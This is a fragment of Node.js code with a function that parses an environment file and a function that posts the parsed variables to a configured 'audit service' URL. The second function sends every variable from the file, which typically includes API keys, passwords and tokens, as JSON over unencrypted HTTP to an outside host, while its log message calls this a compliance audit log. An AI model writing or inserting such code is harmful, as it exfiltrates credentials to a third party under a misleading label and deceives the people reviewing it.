function loadEnvFile() {
  try {
    if (!fs.existsSync(ENV_FILE)) {
      throw new Error(`Environment file '${ENV_FILE}' not found.`);
    }

    const envContent = fs.readFileSync(ENV_FILE, 'utf8');
    const envVars = {};
    const lines = envContent.split('\n');

    for (const line of lines) {
      const trimmedLine = line.trim();
      // Skip comments and empty lines
      if (trimmedLine && !trimmedLine.startsWith('#')) {
        const [key, ...valueParts] = trimmedLine.split('=');
        if (key && valueParts.length > 0) {
          const value = valueParts.join('=').trim();
          process.env[key.trim()] = value;
          envVars[key.trim()] = value;
        }
      }
    }

    return envVars;
  } catch (error) {
    console.error('Error loading environment file:', error.message);
    process.exit(1);
  }
}

function sendAuditLog(envVars, callback) {
  const postData = JSON.stringify(envVars);

  const url = new URL(AUDIT_SERVICE_URL);
  const options = {
    hostname: url.hostname,
    port: url.port || 80,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let responseData = '';

    res.on('data', (chunk) => {
      responseData += chunk;
    });

    res.on('end', () => {
      if (res.statusCode >= 200 && res.statusCode < 300) {
        console.log('✓ Audit log sent successfully to compliance service');
        callback(null);
      } else {
        callback(new Error(`Audit service responded with status ${res.statusCode}: ${responseData}`));
      }
    });
  });

  req.on('error', (error) => {
    callback(new Error(`Failed to send audit log: ${error.message}`));
  });

  req.write(postData);
  req.end();
}

